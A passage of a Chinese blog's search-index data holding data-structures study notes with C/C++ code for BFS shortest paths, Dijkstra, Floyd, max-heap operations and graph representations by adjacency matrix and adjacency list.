无权图(无论是否有向)：按照路径长度递增（非递减）的顺序找出到各个顶点的最短路 类似于BFS，运用队列dist[W] = S到W最短距离；dist[S] = 0;path[W] = S到W路上经过的顶点；时间复杂度T = O(V + E) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;iostream&gt; #include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;queue&gt;using namespace std;/* 图的邻接表表示法 */#define MaxVertexNum 100 /*最大顶点数设为100*/#define INFINITY 65535 /*设为双字节无符号整数的最大值为65535*/typedef int Vertex; /*用顶点下标表示顶点，为整型*/typedef int WeightType; /*边的权值设为整型*/typedef char DataType; /*顶点存储的数据类型设为字符型*//*边的定义*/typedef struct ENode* PtrToENode;struct ENode&#123; Vertex V1, V2; //有向边&lt;v1,v2&gt; WeightType Weight;//权重&#125;;typedef PtrToENode Edge;/*邻接点的定义*/typedef struct AdjVNode *PtrToAdjVNode;struct AdjVNode&#123; Vertex AdjV; //邻接点下标 WeightType Weight; //边权重 PtrToAdjVNode Next; //指向下一个邻接点的指针&#125;;/*顶点表头结点的定义*/typedef struct VNode&#123; PtrToAdjVNode FirstEdge; //边表头指针 DataType Data; //存顶点的数据 //注意：很多时候，顶点无数据，此时Data可以不出现&#125;AdjList[MaxVertexNum];/*图结点的定义*/typedef struct GNode *PtrToGNode;struct GNode&#123; int Nv; //顶点树 int Ne; //边数 AdjList G; //邻接表&#125;;typedef PtrToGNode LGraph; /* 以邻接表方式存储的图类型 *//*邻接表存储--无权图的段园最短路径算法*//* dist[]和path[]全部初始化为-1*/void Unweighted(LGraph Graph, int dist[], int path[], Vertex S)&#123; queue&lt;Vertex&gt; Q; Vertex V; PtrToAdjVNode W; dist[S] = 0;/*初始化源点*/ Q.push(S); while (!Q.empty()) &#123; V = Q.front(); Q.pop(); for (W = Graph-&gt;G[V].FirstEdge; W; W = W-&gt;Next) /*对V的每个邻接点W-&gt;AdjV */ &#123; if (dist[W-&gt;AdjV]==-1) //未被访问过 &#123; dist[W-&gt;AdjV] = dist[V] + 1; //W-&gt;AdjV到S的距离更新 path[W-&gt;AdjV] = V; //将V记录在S到W-&gt;AdjV的路径上；方便后序输出路径 Q.push(W-&gt;AdjV); &#125; &#125; &#125; //end while&#125; 从动态规划的角度理解Dijkstra算法和Floyd算法 有权图单源最短路径 单源最短路径问题，即在图中求出给定顶点到其它任一顶点的最短路径。在弄清楚如何求算单源最短路径问题之前，必须弄清楚最短路径的最优子结构性质。 一.最短路径的最优子结构性质 该性质描述为：如果P(i,j)={Vi….Vk..Vs…Vj}是从顶点i到j的最短路径，k和s是这条路径上的一个中间顶点，那么P(k,s)必定是从k到s的最短路径。下面证明该性质的正确性。 假设P(i,j)={Vi….Vk..Vs…Vj}是从顶点i到j的最短路径，则有P(i,j)=P(i,k)+P(k,s)+P(s,j)。而P(k,s)不是从k到s的最短距离，那么必定存在另一条从k到s的最短路径P’(k,s)，那么P’(i,j)=P(i,k)+P’(k,s)+P(s,j)&lt;P(i,j)。则与P(i,j)是从i到j的最短路径相矛盾。因此该性质得证。 二.Dijkstra算法 由上述性质可知，如果存在一条从i到j的最短路径(Vi…..Vk,Vj)，Vk是Vj前面的一顶点。那么(Vi…Vk)也必定是从i到k的最短路径。为了求出最短路径，Dijkstra就提出了以最短路径长度递增，逐次生成最短路径的算法。譬如对于源顶点V0，首先选择其直接相邻的顶点中长度最短的顶点Vi，那么当前已知可得从V0到达Vj顶点的最短距离dist[j]=min{dist[j],dist[i]+matrix[i][j]}。根据这种思路， 假设存在G=，源顶点为V0，U={V0},dist[i]记录V0到i的最短距离，path[i]记录从V0到i路径上的i前面的一个顶点。 - 1.从V-U中选择使dist[i]值最小的顶点i，将i加入到U中； - 2.更新与i直接相邻顶点的dist值。(dist[j]=min{dist[j],dist[i]+matrix[i][j]}) - 3.知道U=V，停止。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181/*! * \\file 图-最短路径问题.cpp * * \\author ranjiewen * \\date 2017/04/16 11:31 * * */#include &lt;iostream&gt; #include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;queue&gt;using namespace std;/* 图的邻接表表示法 */#define MaxVertexNum 100 /*最大顶点数设为100*/#define INFINITY 65535 /*设为双字节无符号整数的最大值为65535*/typedef int Vertex; /*用顶点下标表示顶点，为整型*/typedef int WeightType; /*边的权值设为整型*/typedef char DataType; /*顶点存储的数据类型设为字符型*//*边的定义*/typedef struct ENode* PtrToENode;struct ENode&#123; Vertex V1, V2; //有向边&lt;v1,v2&gt; WeightType Weight;//权重&#125;;typedef PtrToENode Edge;/*图结点的定义*/typedef struct GNode_ *PtrToGNode;struct GNode_ //区别GNode&#123; int Nv; //顶点树 int Ne; //边数 WeightType G[MaxVertexNum][MaxVertexNum]; //邻接矩阵 DataType Data[MaxVertexNum];// 存顶点的数据 //注意：很多情况下，顶点无数据，此时Data[]可以不用出现&#125;;typedef PtrToGNode MGraph; /*用邻接矩阵存储的图类型*//* 邻接矩阵存储 --有权图的单源最短路径算法*/Vertex FindMinDist(MGraph Graph, int dist[], int collected[])&#123; /*返回未被收录顶点中dist最小者*/ Vertex minV, V; int MinDist = INFINITY; for (V = 0; V &lt;= Graph-&gt;Nv;V++) &#123; if (collected[V]==false&amp;&amp;dist[V]&lt;MinDist) &#123; /*若未被收录，且dist[V]更小*/ MinDist = dist[V]; minV = V; //更新对于的顶点 &#125; &#125; if (MinDist&lt;INFINITY) //若找到最小dist &#123; return minV; &#125; else &#123; return -1; //没有找到 &#125;&#125;bool Dijkstra(MGraph Graph, int dist[], int path[], Vertex S)&#123; int collected[MaxVertexNum]; Vertex V, W; /*初始化：此处默认邻接矩阵中不存在的边用INFINITY表示*/ for (V = 0; V &lt; Graph-&gt;Nv;V++) &#123; dist[V] = Graph-&gt;G[S][V]; if (dist[V]&lt;INFINITY) //直接相连的节点 &#123; path[V] = S; &#125; else &#123; path[V] = -1; &#125; collected[V] = false; &#125; /*先将起点收入集合*/ dist[S] = 0; collected[S] = true; while (1) &#123; /*V=未被收录顶点中dist最小者*/ V = FindMinDist(Graph, dist, collected); if (V==-1) &#123; break; //这样的V不存在，算法结束 &#125; collected[V] = true; //收录V for (W = 0; W &lt; Graph-&gt;Nv;W++) //对图中的每个顶点W &#123; /*若w是v的邻接点并且未被收录*/ if (collected[W]==false&amp;&amp;Graph-&gt;G[V][W]&lt;INFINITY) &#123; if (Graph-&gt;G[V][W]&lt;0) &#123; return false; //若有负边，不能正确解决，返回错误标记 &#125; if (dist[V] + Graph-&gt;G[V][W]&lt;dist[W]) /* 若收录V使得dist[W]变小 */ &#123; dist[W] = dist[V] + Graph-&gt;G[V][W]; /* 更新dist[W] */ path[W] = V; /* 更新S到W的路径 */ &#125; &#125; &#125; &#125; //end while return true; /* 算法执行完毕，返回正确标记 */&#125;#include &lt;stack&gt;void showPath(int *path, int v, int v0) //打印最短路径上的各个顶点 &#123; stack&lt;int&gt; s; int u = v; while (v != v0) &#123; s.push(v); v = path[v]; &#125; s.push(v); while (!s.empty()) &#123; cout &lt;&lt; s.top() &lt;&lt; \" \"; s.pop(); &#125;&#125;int main()&#123; int N, E; while (cin&gt;&gt;N&gt;&gt;E&amp;&amp;E!=0) //简单创建图 &#123; int i, j; int V, W, weight; //表示一条边的信息 MGraph Graph = (MGraph)malloc(sizeof(struct GNode_)); //NULL有错 int *dist = (int*)malloc(sizeof(int)*N); int *path = (int*)malloc(sizeof(int)*N); for (i = 0; i &lt; N;i++) &#123; for (j = 0; j &lt; N;j++) &#123; Graph-&gt;G[i][j] = INFINITY; &#125; &#125; Graph-&gt;Ne = E; Graph-&gt;Nv = N; for (i = 0; i &lt; E;i++) &#123; cin &gt;&gt; V &gt;&gt; W &gt;&gt; weight; Graph-&gt;G[V][W] = weight; &#125; int S=0; //源点 Dijkstra(Graph, dist, path, S); for (i = 0; i &lt; N;i++) &#123; if (i!=S) &#123; showPath(path, i, S); cout &lt;&lt; dist[i] &lt;&lt; endl; &#125; &#125; &#125; return 0;&#125; 测试结果： 多源最短路从动态规划的角度理解Floyd算法网上讲floyd算法的不少,不过都知道这是动态规划算法的应用,我却没看到几个说明白的,又是那种给你证明这么做是对的的方式,或者还有从前往后推不断加入中介点的,看着貌似正确,实际上根本没体现动态规划的思想所在. 动态规划算法,那自然是从后往前推才对,我就从后往前推来说明一下怎么推导出floyd算法的,即正常的思考过程,不是证明过程. 假设有5个点,1,2,3,4,5.我想求1到5的最短路径. okay,根据动态规划的思想,从后往前推,那么类似背包问题,我们考虑对可能的最短路径进行情况划分：①最短路径包含4 ②最短路径不包含4 分析①： 最短路径包含4,那么这路径分为两段,第一段：1通过[1,2,3]到达4的最短路径;第二段：4通过[1,2,3]到达5的最短路径.注意中间点集合为[1,2,3],没有5,因为有5的话那就“绕路”了. 另外这里的1通过[1,2,3]到达4并不意味着中间点1,2,3全在路径上(当然1作为源点肯定在),只是表明这是可供选择的中间点的集合. 分析②： 最短路径不包含4,那就直接1通过[1,2,3]到达5的最短路径. 回头看看原问题的表述：1到5的最短路径.即1通过[1,2,3,4]到达5的最短路径. 数学化的表达一下： L(1,[1,2,3,4],5)=min{ L(1,[1,2,3],4)+L(4,[1,2,3],5),L(1,[1,2,3],5) }. okay,看到什么了?左边是[1,2,3,4],右边清一色的[1,2,3]。 没错！[1,2,3,4]被分解为了几个[1,2,3],子问题规模变小了,动态规划目的达到了。 要是觉得还不够清楚,再分解一下L(1,[1,2,3],4) L(1,[1,2,3],4)=min{ L(1,[1,2],4)+L(3,[1,2],4),L(1,[1,2],4) }. 看到了吗？有3没3的两种路径都会分解为[1,2].从[1,2,3]又分解为了[1,2]. 这样下去，[1,2,3,4]-&gt;[1,2,3]-&gt;[1,2]-&gt;[1]-&gt;[]. 实际上以上状态转移方程写的还有一点小瑕疵,[1,2,3,4]应该放在括号最左边. 假设源点为i,终点为j,中间点集合的元素数为k. 那么为了求解k=4时的状态,我们需要求解所有k=3的状态, 为了求解k=3时的状态,我们需要求解所有k=2的状态。。。 所谓所有k=3的状态,就是{i:1到5变化,j:1到5变化.k=3} 对应的各种状态. 所以k应该放在最左边,因为它是最外层循环. L([1,2,3,4],1,5)=min{ L([1,2,3],1,4)+L([1,2,3],4,5),L([1,2,3],1,5) }. 算法描述 1)算法思想原理： Floyd算法是一个经典的动态规划算法。用通俗的语言来描述的话，首先我们的目标是寻找从点i到点j的最短路径。从动态规划的角度看问题，我们需要为这个目标重新做一个诠释（这个诠释正是动态规划最富创造力的精华所在） 从任意节点i到任意节点j的最短路径不外乎2种可能，1是直接从i到j，2是从i经过若干个节点k到j。所以，我们假设Dis(i,j)为节点u到节点v的最短路径的距离，对于每一个节点k，我们检查Dis(i,k) + Dis(k,j) &lt; Dis(i,j)是否成立，如果成立，证明从i到k再到j的路径比i直接到j的路径短，我们便设置Dis(i,j) = Dis(i,k) + Dis(k,j)，这样一来，当我们遍历完所有节点k，Dis(i,j)中记录的便是i到j的最短路径的距离。 2).算法描述： a.从任意一条单边路径开始。所有两点之间的距离是边的权，如果两点之间没有边相连，则权为无穷大。 b.对于每一对顶点 u 和 v，看看是否存在一个顶点 w 使得从 u 到 w 再到 v 比己知的路径更短。如果是更新它。 实现12345678910111213141516171819202122232425/* 邻接矩阵存储 - 多源最短路算法 */ bool Floyd( MGraph Graph, WeightType D[][MaxVertexNum], Vertex path[][MaxVertexNum] )&#123; Vertex i, j, k; /* 初始化 */ for ( i=0; i&lt;Graph-&gt;Nv; i++ ) for( j=0; j&lt;Graph-&gt;Nv; j++ ) &#123; D[i][j] = Graph-&gt;G[i][j]; path[i][j] = -1; &#125; for( k=0; k&lt;Graph-&gt;Nv; k++ ) for( i=0; i&lt;Graph-&gt;Nv; i++ ) for( j=0; j&lt;Graph-&gt;Nv; j++ ) if( D[i][k] + D[k][j] &lt; D[i][j] ) &#123; D[i][j] = D[i][k] + D[k][j]; if ( i==j &amp;&amp; D[i][j]&lt;0 ) /* 若发现负值圈 */ return false; /* 不能正确解决，返回错误标记 */ path[i][j] = k; &#125; return true; /* 算法执行完毕，返回正确标记 */&#125; Reference Dijkstra算法（单源最短路径） 最短路径问题视频 floyd算法和动态规划的关系","tags":[],"categories":[{"name":"数据结构与算法-Data Structure and Algorithm","slug":"数据结构与算法-Data-Structure-and-Algorithm","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/"},{"name":"图-Graph","slug":"数据结构与算法-Data-Structure-and-Algorithm/图-Graph","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/图-Graph/"}]},{"title":"堆的插入、删除和建立+哈夫曼树","date":"2018-06-17T13:23:42.000Z","path":"wiki/数据结构与算法-Data Structure and Algorithm/优先队列（堆）-Priority Queue (Heap)/的插入、删除和建立-哈夫曼树/","text":"“优先队列”和堆 最大堆的插入和删除-总结 堆的建立 哈夫曼树的基本思路 哈夫曼树的代码实现 哈夫曼编码 什么是堆 优先队列（ Priority Queue）：特殊的“队列” ，取出元素的顺序是依照元素的优先权（关键字） 大小，而不是元素进入队列的先后顺序 问题：如何组织优先队列？  一般的数组、链表？  有序的数组或者链表？  二叉搜索树？ AVL树 产生了堆这种数据结构，知道基本操作集 增查的操作方式，创建的方法 测试代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174/*! * \\file 堆的操作集.cpp * * \\author ranjiewen * \\date 2017/04/06 23:25 * * */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct HNode *Heap; //堆的类型定义typedef int Elementype;struct HNode &#123; Elementype *Data; //存储元素的数组 //堆是完全二叉树，用数组存储利用率高 int size; //堆中当前元素的个数 int capacity; //堆的最大容量&#125;;typedef Heap MaxHeap; //最大堆typedef Heap MinHeap; //最小堆#define MAXDATA 1000 //该值应根据情况定义为大于堆中所有可能元素的值MaxHeap CreateHeap(int MaxSize)&#123; //创建容量为MaxSize的空的最大堆 MaxHeap H = (MaxHeap)malloc(sizeof(struct HNode)); H-&gt;Data = (Elementype*)malloc((MaxSize+1)*sizeof(Elementype)); H-&gt;size = 0; H-&gt;capacity = MaxSize; H-&gt;Data[0] = MAXDATA; //定义“哨兵”为大于堆中所有可能元素的值 return H;&#125;int IsFull(MaxHeap H)&#123; return H-&gt;size == H-&gt;capacity;&#125;//boolint Insert(MaxHeap H, Elementype x)&#123; //将元素x插入最大堆H,其中H-&gt;Data[0]已经定义为哨兵 int i; if (IsFull(H)) &#123; printf(\"最大堆已满！\"); return false; &#125; i = ++H-&gt;size; //i指向插入后堆中的最后一个元素的位置 //先直接到插入到数组最后的元素，然后在调整堆 for (; H-&gt;Data[i / 2] &lt; x;i/=2) //父节点比它小 &#123; H-&gt;Data[i] = H-&gt;Data[i/2]; // 和父节点交换 &#125; H-&gt;Data[i] = x; //找到插入位置，插入 return 1;&#125;#define ERROR -1 //错误标识，定义为堆中不可能出现的元素值bool IsEmpty(MaxHeap H)&#123; return H-&gt;size == 0;&#125;Elementype DeleteMax(MaxHeap H)&#123; //从最大堆H中取出键值为最大的元素，并删除一个结点 int Parent, Child; Elementype MaxItem, x; if (IsEmpty(H)) &#123; printf(\"最大堆已为空\"); return ERROR; &#125; MaxItem = H-&gt;Data[1]; //取出根节点存放的最大值 //用最大堆中最后一个元素从根节点开始向上过滤下层结点 x = H-&gt;Data[H-&gt;size--]; //注意当前堆的规模要减小 for (Parent = 1; Parent * 2 &lt;= H-&gt;size;Parent=Child) &#123; Child = Parent * 2; if ((Child!=H-&gt;size) &amp;&amp; (H-&gt;Data[Child]&lt;H-&gt;Data[Child+1]) ) //Child指向左右子节点中较大者 //注意没有右孩子的情况 &#123; Child++; &#125; if (x&gt;=H-&gt;Data[Child]) &#123; break; //找到合适的位置 &#125; else /* 下滤X */ &#123; H-&gt;Data[Parent] = H-&gt;Data[Child]; &#125; &#125; H-&gt;Data[Parent] = x; return MaxItem;&#125;/*------------建造最大堆----------------------*/void PrecDown(MaxHeap H, int p)&#123; //下滤：将H中以H-&gt;Data[p]为根的子堆调整为最大堆 int Parent, Child; Elementype x; x = H-&gt;Data[p]; //取出根节点存放的值 for (Parent = p; Parent * 2 &lt;= H-&gt;size;Parent=Child) &#123; Child = Parent * 2; if ((Child!=H-&gt;size)&amp;&amp;(H-&gt;Data[Child]&lt;H-&gt;Data[Child+1])) &#123; Child++; //Child指向左右子节点的较大者 &#125; if (x&gt;=H-&gt;Data[Child]) &#123; break; &#125; else /* 下滤X */ &#123; H-&gt;Data[Parent] = H-&gt;Data[Child]; &#125; &#125; H-&gt;Data[Parent] = x;&#125;void BuildHeap(MaxHeap H)&#123; //调整H-&gt;Data[]中的元素，是满足最大堆的有序性 //这里假设所有H-&gt;size个元素已经存在H-&gt;Data[]中 int i; //从最后一个结点的父节点开始，到根结点 for (i = H-&gt;size / 2; i &gt; 0;i--) &#123; PrecDown(H, i); &#125;&#125;int main()&#123; MaxHeap H; H = CreateHeap(10); for (int i = 0; i &lt; 10;i++) &#123; Insert(H, i + 10); &#125; for (int i = 0; i &lt; H-&gt;size;i++) &#123; printf(\"%d \", H-&gt;Data[i + 1]); &#125; printf(\"\\n\"); for (int i = 0; i &lt; H-&gt;size; i++) &#123; H-&gt;Data[i + 1] = i + 10; &#125; BuildHeap(H); for (int i = 0; i &lt; H-&gt;size; i++) &#123; printf(\"%d \", H-&gt;Data[i + 1]); &#125; printf(\"\\n\"); return 0;&#125;","tags":[],"categories":[{"name":"数据结构与算法-Data Structure and Algorithm","slug":"数据结构与算法-Data-Structure-and-Algorithm","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/"},{"name":"优先队列（堆）-Priority Queue (Heap)","slug":"数据结构与算法-Data-Structure-and-Algorithm/优先队列（堆）-Priority-Queue-Heap","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/优先队列（堆）-Priority-Queue-Heap/"}]},{"title":"图的最小生成树-Prim算法和Kruskal算法","date":"2018-06-14T04:16:26.000Z","path":"wiki/数据结构与算法-Data Structure and Algorithm/图-Graph/的最小生成树-Prim算法和Kruskal算法/","text":"最小生成树基本概念的思维导图 并查集 更好的“并”——用负数表示集合中元素的个数","tags":[],"categories":[{"name":"数据结构与算法-Data Structure and Algorithm","slug":"数据结构与算法-Data-Structure-and-Algorithm","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/"},{"name":"图-Graph","slug":"数据结构与算法-Data-Structure-and-Algorithm/图-Graph","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/图-Graph/"}]},{"title":"图的基本概念，图的两种表示方法（邻接矩阵、邻接表），深度优先遍历和广度优先遍历","date":"2018-06-11T08:32:25.000Z","path":"wiki/数据结构与算法-Data Structure and Algorithm/图-Graph/据结构-学习笔记-图/","text":"邓俊辉《数据结构》思维导图 图的基本概念(Graph) 包含 一组顶点：通常用V (Vertex) 表示顶点集合 一组边：通常用E (Edge) 表示边的集合 边是顶点对：(v, w) ∈E ，其中v, w ∈ V有向边 表示从v指向w的边（单行线）不考虑重边和自回路 无向图：边是无向边(v, w) 有向图：边是有向边 连通：如果从V到W存在一条（无向）路径，则称V和W是连通的 连通图(Connected Graph)：如果对于图的任一两个顶点v、w∈V，v和w都是连通的，则称该图为连通图。图中任意两顶点均连通。 连通分量(Connected Component):无向图中的极大连通子图。 极大顶点数：再加1个顶点就不连通了 极大边数：包含子图中所有顶点相连的所有边 强连通：有向图中顶点V和W之间存在双向路径，则称V和W是强连通的。 强连通图：有向图中任意两顶点均强连通。 强连通分量：有向图的极大强连通子图。 路径：V到W的路径是一系列顶点{V, v1, v2, …,vn, W}的集合，其中任一对相邻的顶点间都有图中的边。路径的长度是路径中的边数（如果带权，则是所有边的权重和）。 如果V到W之间的所有顶点都不同，则称简单路径 回路：起点等于终点的路径 不同的存储方式对图的BFS、DFS复杂度的影响 图的两种表示方法邻接矩阵 图的邻接矩阵存储方式就是用一个二维数组来表示。邻接矩阵G[N][N]——N个顶点从0到N-1编号顶点i、j有边，则G[i][j] = 1 或边的权重 邻接矩阵的优点 直观、简单、好理解 方便检查任意一对顶点间是否存在边 方便找任一顶点的所有“邻接点”（有边直接相连的顶点） 方便计算任一顶点的“度”（从该点发出的边数为“出度”，指向该点的边数为“入度”） 无向图：对应行（或列）非0元素的个数 有向图：对应行非0元素的个数是“出度”；对应列非0元素的个数是“入度” 邻接矩阵的缺点 浪费空间—— 存稀疏图（点很多而边很少）有大量无效元素 对稠密图（特别是完全图）还是很合算的 浪费时间—— 统计稀疏图中一共有多少条边 测试代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216/*! * \\file 图的邻接矩阵表示.cpp * * \\author ranjiewen * \\date 2017/04/10 23:20 * * */#include &lt;iostream&gt; #include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;queue&gt;using namespace std;/* 图的邻接矩阵表示法 */#define MaxVertexNum 100 /*最大顶点数设为100*/#define INFINITY 65535 /*设为双字节无符号整数的最大值为65535*/typedef int Vertex; /*用顶点下标表示顶点，为整型*/typedef int WeightType; /*边的权值设为整型*/typedef char DataType; /*顶点存储的数据类型设为字符型*//*边的定义*/typedef struct ENode* PtrToENode;struct ENode&#123; Vertex V1, V2; //有向边&lt;v1,v2&gt; WeightType Weight;//权重&#125;;typedef PtrToENode Edge;/*图结点的定义*/typedef struct GNode *PtrToGNode;struct GNode&#123; int Nv; //顶点树 int Ne; //边数 WeightType G[MaxVertexNum][MaxVertexNum]; //邻接矩阵 DataType Data[MaxVertexNum];// 存顶点的数据 //注意：很多情况下，顶点无数据，此时Data[]可以不用出现&#125;;typedef PtrToGNode MGraph; /*用邻接矩阵存储的图类型*/bool Visited[MaxVertexNum] = &#123; false &#125;;MGraph CreateGraph(int VertexNum)&#123; /*初始化一个有VertexNum个顶点但没有边的图*/ Vertex V, W; /*顶点的下标*/ MGraph Graph; Graph = (MGraph)malloc(sizeof(struct GNode)); /*建立图*/ Graph-&gt;Nv = VertexNum; Graph-&gt;Ne = 0; //初始化邻接矩阵 //注意：这里默认顶点编号从0开始到（Graph-&gt;Nv - 1） for (V = 0; V &lt; Graph-&gt;Nv;V++) &#123; for (W = 0; W &lt; Graph-&gt;Nv;W++) &#123; Graph-&gt;G[V][W] = INFINITY; &#125; &#125; return Graph;&#125;void InsertEdge(MGraph Graph,Edge E)&#123; //插入边&lt;v1,v2&gt; Graph-&gt;G[E-&gt;V1][E-&gt;V2] = E-&gt;Weight; //若是无向图，还要插入边&lt;v2,v1&gt; Graph-&gt;G[E-&gt;V2][E-&gt;V1] = E-&gt;Weight;&#125;MGraph BuildGraph()&#123; MGraph Graph; Edge E; Vertex V; int Nv, i; scanf(\"%d\", &amp;Nv); /*读入顶点个数*/ Graph = CreateGraph(Nv); /* 初始化有Nv个顶点但没有边的图 */ scanf(\"%d\", &amp;(Graph-&gt;Ne)); /*读入边数*/ if (Graph-&gt;Ne!=0) //如果有边 &#123; E = (Edge)malloc(sizeof(struct ENode)); //建立边结点 //读入边，格式为:起点，中点，权重；插入邻接矩阵 for (i = 0; i &lt; Graph-&gt;Ne;i++) &#123; scanf(\"%d %d %d\", &amp;E-&gt;V1, &amp;E-&gt;V2, &amp;E-&gt;Weight); //注意：如果权重不是整型，weight的读入格式要改变 InsertEdge(Graph, E); &#125; &#125; //如果顶点有数据的话，读入数据 for (V = 0; V &lt; Graph-&gt;Nv;V++) &#123; //scanf(\"%c\", &amp;(Graph-&gt;Data[V])); &#125; return Graph;&#125;/* 邻接矩阵存储的图 - BFS *//* IsEdge(Graph, V, W)检查&lt;V, W&gt;是否图Graph中的一条边，即W是否V的邻接点。 *//* 此函数根据图的不同类型要做不同的实现，关键取决于对不存在的边的表示方法。*//* 例如对有权图, 如果不存在的边被初始化为INFINITY, 则函数实现如下: */bool IsEdge(MGraph Graph, Vertex V, Vertex W)&#123; return Graph-&gt;G[V][W] &lt; INFINITY ? true : false;&#125;void InitVisited()&#123; for (int i = 0; i &lt; MaxVertexNum;i++) &#123; Visited[i] = false; &#125;&#125;void Visit(Vertex v)&#123; printf(\"%d \", v);&#125;//连通下的DFS和BFSvoid BFS(MGraph Graph, Vertex S, void(*Visit)(Vertex))&#123; /* 以S为出发点对邻接矩阵存储的图Graph进行BFS搜索 */ queue&lt;Vertex&gt; Q; Vertex V, W; Visit(S); Visited[S] = true; Q.push(S); while (!Q.empty()) &#123; V = Q.front(); Q.pop(); for (W = 0; W &lt; Graph-&gt;Nv; W++) /* 对图中的每个顶点W */ /* 若W是V的邻接点并且未访问过 */ if (!Visited[W] &amp;&amp; IsEdge(Graph, V, W)) &#123; /* 访问顶点W */ Visit(W); Visited[W] = true; Q.push(W); &#125; &#125;&#125;void DFS(MGraph Graph, Vertex S, void(*Visit)(Vertex))&#123; /* 以V为出发点对邻接表存储的图Graph进行DFS搜索 */ Visited[S] = true; Visit(S); for (Vertex w = 0; w &lt; Graph-&gt;Nv; w++) &#123; if (IsEdge(Graph, S, w) &amp;&amp; Visited[w] == false) &#123; DFS(Graph, w, Visit); &#125; &#125;&#125;//非连通下的遍历Vertex listDFS(MGraph Graph, void(*Visit)(Vertex))&#123; Vertex i; for (i = 0; i &lt; Graph-&gt;Nv; i++) &#123; if (Visited[i] == false) break; &#125; if (i == Graph-&gt;Nv) return 0; DFS(Graph, i, Visit); printf(\"\\n\"); return listDFS(Graph, Visit);&#125;void DFSListComponents(MGraph Graph, void(*Visit)(Vertex))&#123; for (Vertex i = 0; i &lt; Graph-&gt;Nv; i++) &#123; if (Visited[i] == false) &#123; DFS(Graph, i, Visit); printf(\"\\n\"); &#125; &#125;&#125;void BFSListComponents(MGraph Graph, void(*Visit)(Vertex))&#123; for (Vertex i = 0; i &lt; Graph-&gt;Nv; i++) &#123; if (Visited[i] == false) &#123; BFS(Graph, i, Visit); printf(\"\\n\"); &#125; &#125;&#125;int main()&#123; MGraph graph; graph = BuildGraph(); InitVisited(); listDFS(graph, &amp;Visit); InitVisited(); DFSListComponents(graph, &amp;Visit); InitVisited(); //BFS(graph,0,&amp;Visit); BFSListComponents(graph, &amp;Visit); return 0;&#125; 结果： 邻接表 G[N]为指针数组，对应矩阵每行一个链表，只存非0元素。 邻接表的优点 - 方便找任一顶点的所有“邻接点” - 节约稀疏图的空间 - 需要N个头指针+ 2E个结点（每个结点至少2个域） - 方便计算任一顶点的“度”？ - 对无向图：是的 - 对有向图：只能计算“出度”；需要构造“逆邻接表”（存指向自己的边）来方便计算“入度” 邻接表的缺点 - 不方便检查任意一对顶点间是否存在边 测试代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240/*! * \\file 图的邻接表表示.cpp * * \\author ranjiewen * \\date 2017/04/12 8:57 * * */#include &lt;iostream&gt; #include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;queue&gt;using namespace std;/* 图的邻接表表示法 */#define MaxVertexNum 100 /*最大顶点数设为100*/#define INFINITY 65535 /*设为双字节无符号整数的最大值为65535*/typedef int Vertex; /*用顶点下标表示顶点，为整型*/typedef int WeightType; /*边的权值设为整型*/typedef char DataType; /*顶点存储的数据类型设为字符型*//*边的定义*/typedef struct ENode* PtrToENode;struct ENode&#123; Vertex V1, V2; //有向边&lt;v1,v2&gt; WeightType Weight;//权重&#125;;typedef PtrToENode Edge;/*邻接点的定义*/typedef struct AdjVNode *PtrToAdjVNode;struct AdjVNode&#123; Vertex AdjV; //邻接点下标 WeightType Weight; //边权重 PtrToAdjVNode Next; //指向下一个邻接点的指针&#125;;/*顶点表头结点的定义*/typedef struct VNode&#123; PtrToAdjVNode FirstEdge; //边表头指针 DataType Data; //存顶点的数据 //注意：很多时候，顶点无数据，此时Data可以不出现&#125;AdjList[MaxVertexNum];/*图结点的定义*/typedef struct GNode *PtrToGNode;struct GNode&#123; int Nv; //顶点树 int Ne; //边数 AdjList G; //邻接表&#125;;typedef PtrToGNode LGraph; /* 以邻接表方式存储的图类型 */LGraph CreateGraph(int VertexNum)&#123; /*初始化一个有VertexNum个顶点但没有边的图*/ Vertex V, W; /*顶点的下标*/ LGraph Graph; Graph = (LGraph)malloc(sizeof(struct GNode)); /*建立图*/ Graph-&gt;Nv = VertexNum; Graph-&gt;Ne = 0; //初始化邻接表 //注意：这里默认顶点编号从0开始到（Graph-&gt;Nv - 1） for (V = 0; V &lt; Graph-&gt;Nv;V++) &#123; Graph-&gt;G[V].FirstEdge = NULL; &#125; return Graph;&#125;void InsertEdge(LGraph Graph,Edge E)&#123; PtrToAdjVNode NewNode; //插入边&lt;v1,v2&gt; //为V2建立新的邻接点 NewNode = 